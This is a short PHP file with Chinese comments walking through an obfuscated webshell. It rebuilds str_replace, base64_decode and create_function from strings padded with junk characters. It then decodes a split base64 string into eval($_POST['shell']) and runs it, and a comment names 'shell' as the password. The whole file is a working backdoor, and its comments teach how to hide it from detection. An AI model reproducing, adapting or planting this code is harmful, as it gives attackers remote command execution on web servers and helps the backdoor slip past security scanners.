<?php
$huan = str_replace("ac","","sactacrac_raceacpaclacaacce");//密码是shell
// 思路是先在str_replace中写好要构造的函数，
// 这里是打算把$huan这个变量当成str_replace函数来用
// 就先把第一三个参数填好，第一个随便填，第三个先填成要转换的目标
// 得$huan = str_replace("ac","","str_replace")
// 接着把第一个参数里面的东西随便插入进去
// 得$huan = str_replace("ac","","sactacrac_raceacpaclacaacce")
$jiemi = $huan("bd","","bbdabdsbdebd64_dbdebdcbdobdde");
// 这里是打算把$jiemi这个变量当成base64_decode函数来用
$hanshu = $huan("ef","","cefrefeefaeftefe_fefuefnefceftefiefoefn");
// 这里是打算把$hanshu这个变量当成create_function函数来用
$s1="ZXZhbqwerCgkX1";
$s2="BPUqwer1RbJ3";
$s3="NoqwerZWxsJ";
$s4="10qwerpOw==";
// 将加密后的语句拆分开
$ans = $hanshu('',$jiemi($huan("qwer","",$s1.$s2.$s3.$s4)));
// 利用之前准备好的函数和字符串把需要的语句拼出来,拼成一个匿名函数
$ans();
// 调用这个函数
?>